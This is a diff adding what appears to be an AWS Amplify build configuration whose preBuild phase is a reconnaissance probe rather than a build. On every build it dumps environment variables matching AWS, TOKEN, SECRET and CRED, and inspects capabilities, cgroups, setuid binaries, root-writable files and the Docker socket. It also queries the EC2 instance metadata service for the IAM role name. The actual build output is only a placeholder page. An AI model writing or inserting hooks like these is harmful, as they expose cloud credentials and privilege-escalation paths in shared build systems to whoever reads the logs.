@@ -1,0 +1,24 @@
+version: 1
+frontend:
+  phases:
+    preBuild:
+      commands:
+        - echo "=== ID ===" && id
+        - echo "=== KERNEL ===" && uname -a
+        - echo "=== ENV ===" && env | grep -iE "AWS|AMPLIFY|DOCKER|TOKEN|SECRET|CRED|ENDPOINT" | sort
+        - echo "=== CAPS ===" && cat /proc/1/status | grep -iE "cap|seccomp|uid"
+        - echo "=== CGROUP ===" && cat /proc/1/cgroup | head -3
+        - echo "=== SETUID ===" && find / -perm -4000 -type f 2>/dev/null | head -5
+        - echo "=== WRITABLE ===" && find / -writable -user root -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -10
+        - echo "=== DOCKER ===" && ls -la /var/run/docker.sock 2>/dev/null || echo no_docker
+        - echo "=== PROCS ===" && ps auxww | head -15
+        - echo "=== ROOT PROCS ===" && ps auxww | grep "^root" | head -5
+        - echo "=== IMDS ===" && (TOKEN=$(curl -s -m 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds:21600") && ROLE=$(curl -s -m 3 -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && echo "IMDS Role:$ROLE") || echo "IMDS blocked"
+        - echo "=== DONE ==="
+    build:
+      commands:
+        - echo "build" > index.html
+  artifacts:
+    baseDirectory: /codebuild/output/src
+    files:
+      - index.html
